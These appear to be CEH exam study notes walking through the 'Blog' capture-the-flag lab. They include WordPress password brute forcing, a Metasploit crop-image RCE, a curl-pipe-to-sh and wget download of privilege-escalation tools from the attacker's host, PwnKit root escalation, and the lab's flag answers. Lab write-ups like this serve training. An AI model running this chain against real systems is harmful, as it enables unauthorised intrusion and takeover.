# 🧠 Blog Room – CEH Practical Notes (Full Attack Chain)

---

## 🔰 Overview

**Target Type:** Linux Web Server  
**Attack Type:** Full Pentest Flow

---

## 🎯 Topics Covered

- Hosts file setup
    
- Nmap scanning
    
- SMB enumeration
    
- Directory fuzzing (ffuf)
    
- WordPress enumeration (WPScan)
    
- Password brute force
    
- Metasploit exploitation
    
- Reverse shell / Meterpreter
    
- Privilege escalation (LinPEAS + PwnKit)
    

---

# 🧭 Phase 1: Initial Setup

---

## 🌐 Add Domain to Hosts File

```bash
sudo nano /etc/hosts
```

Add:

```
<IP> blog.thm
```

---

### 🧩 Diagram

```
Local Machine → Hosts File → blog.thm → Target IP
```

---

# 🔍 Phase 2: Scanning & Enumeration

---

## ⚡ Nmap Scan

```bash
nmap -sV -sC -A <IP>
```

---

### 📊 Results

|Port|Service|
|---|---|
|22|OpenSSH 7.6p1|
|80|Apache 2.4.29|
|139/445|SMB (Samba 4.7.6)|

---

### 🧩 Diagram

```
Target → Open Ports → Services → Attack Surface
```

---

# 📁 Phase 3: SMB Enumeration

---

## 🔍 Scan SMB Shares

```bash
nmap --script smb-enum-shares <IP>
```

---

## 📂 Access Share

```bash
smbclient // <IP>/BillySMB
```

---

### 🧠 Insight

- Found images → not useful
    
- Continue enumeration
    

---

# 🌐 Phase 4: Directory Fuzzing

---

## ⚡ ffuf Command

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<IP>/FUZZ
```

---

### 🎯 Findings

- WordPress detected
    
- Found:
    

```
/wp-login.php
```

---

### 🧩 Diagram

```
Wordlist → ffuf → Hidden Paths → Web Structure
```

---

# 🧠 Phase 5: WordPress Enumeration

---

## ⚙️ WPScan (Docker workaround)

---

## 🔍 Enumerate Users

```bash
wpscan --url blog.thm --enumerate u
```

---

### 🎯 Found Users

- `kwheel`
    
- (another user)
    

---

# 🔓 Phase 6: Password Brute Force

---

## ⚡ WPScan Password Attack

```bash
wpscan --url blog.thm -U kwheel -P /usr/share/wordlists/rockyou.txt
```

---

### 🔑 Credentials Found

```
Username: kwheel
Password: cutiepie1
```

---

### 🧩 Diagram

```
Usernames + Wordlist → WPScan → Valid Credentials
```

---

# 🔐 Phase 7: Login & Exploitation

---

## 🔑 Login

```
http://blog.thm/wp-login.php
```

✔ Normal user (no admin access)

---

## 🔍 Vulnerability Discovery

- WordPress version → 5.0
    
- Found exploit → **Image Crop RCE**
    

---

# 💣 Phase 8: Metasploit Exploitation

---

## ⚡ Start Metasploit

```bash
msfconsole
```

---

## 🔍 Search Exploit

```bash
search crop-image
```

---

## 🎯 Use Exploit

```bash
use exploit/multi/http/wp_crop_rce
```

---

## ⚙️ Set Options

```bash
set USERNAME kwheel
set PASSWORD cutiepie1
set RHOST <IP>
set LHOST <Your_IP>
exploit
```

---

### 🎉 Result

✔ Meterpreter session opened

---

### 🧩 Diagram

```
Exploit → RCE → Reverse Shell → Meterpreter
```

---

# 🖥️ Phase 9: Shell Access

---

## 🔄 Get Shell

```bash
shell
```

---

## 🔍 Basic Enumeration

```bash
whoami
id
pwd
```

---

# 🚀 Phase 10: Privilege Escalation

---

## 🧠 Tool: LinPEAS

---

## 📥 Run LinPEAS

```bash
curl http://<YOUR_IP>/linpeas.sh | sh
```

---

### 🔍 Result

✔ Found vulnerability → **PwnKit**

---

# 💥 Phase 11: PwnKit Exploit

---

## 📥 Download Exploit

```bash
cd /tmp
wget http://<YOUR_IP>/PwnKit
```

---

## ⚙️ Execute

```bash
chmod +x PwnKit
./PwnKit
```

---

## 🔍 Verify

```bash
whoami
```

---

### 🎉 Output

```
root
```

---

### 🧩 Diagram

```
Low Priv → Exploit (PwnKit) → Root Access
```

---

# 🏁 Phase 12: Capture Flags

---

## 🔍 Find Root Flag

```bash
find / -name root.txt
```

---

## 📖 Read

```bash
cat /root/root.txt
```

---

## 🔍 Find User Flag

```bash
find / -name user.txt
```

---

### 📂 Location

```
/media/usb/user.txt
```

---

## 📖 Read

```bash
cat /media/usb/user.txt
```

---

# 🧾 Final Answers (Important)

---

|Question|Answer|
|---|---|
|CMS|WordPress|
|Version|5.0|
|Root flag|9a0b2b618bef9bfa7ac28c1353d9f318|
|User flag|c8421899aae571f7af486492b71a8ab7|
|User.txt location|/media/usb/user.txt|

---

# 🧠 Full Attack Flow (VERY IMPORTANT)

---

```
1. Add domain → /etc/hosts
2. Nmap scan
3. SMB enumeration
4. Directory fuzzing (ffuf)
5. WordPress detection
6. WPScan → users
7. WPScan → password brute force
8. Login to WordPress
9. Find exploit (RCE)
10. Metasploit exploit
11. Get shell
12. Run LinPEAS
13. Exploit PwnKit
14. Get root
15. Capture flags
```

---

# 🔥 Quick Commands Cheat Sheet

---

```bash
# Hosts
nano /etc/hosts

# Scan
nmap -sV -sC -A <IP>

# SMB
nmap --script smb-enum-shares <IP>
smbclient //<IP>/BillySMB

# Fuzzing
ffuf -w wordlist -u http://<IP>/FUZZ

# WPScan
wpscan --url blog.thm --enumerate u
wpscan --url blog.thm -U kwheel -P rockyou.txt

# Metasploit
msfconsole
use exploit/multi/http/wp_crop_rce
set USERNAME kwheel
set PASSWORD cutiepie1
exploit

# Priv Esc
curl http://<IP>/linpeas.sh | sh
wget http://<IP>/PwnKit
chmod +x PwnKit
./PwnKit

# Flags
find / -name root.txt
cat /root/root.txt
```

---

# ⚠️ Common Mistakes

---

❌ Forgetting hosts entry  
❌ Not fuzzing directories  
❌ Ignoring SMB  
❌ Skipping WPScan  
❌ Not checking version exploits  
❌ Not running LinPEAS

---

# 🚀 CEH Practical Strategy

---

1. Always **scan first (Nmap)**
    
2. Enumerate EVERYTHING (SMB, web, directories)
    
3. Identify tech stack (WordPress, version)
    
4. Use automated tools (WPScan, ffuf)
    
5. Try exploits (Metasploit/manual)
    
6. Get shell → upgrade shell
    
7. Run privilege escalation tools
    
8. Look for known exploits (PwnKit, SUID, etc.)
    

---

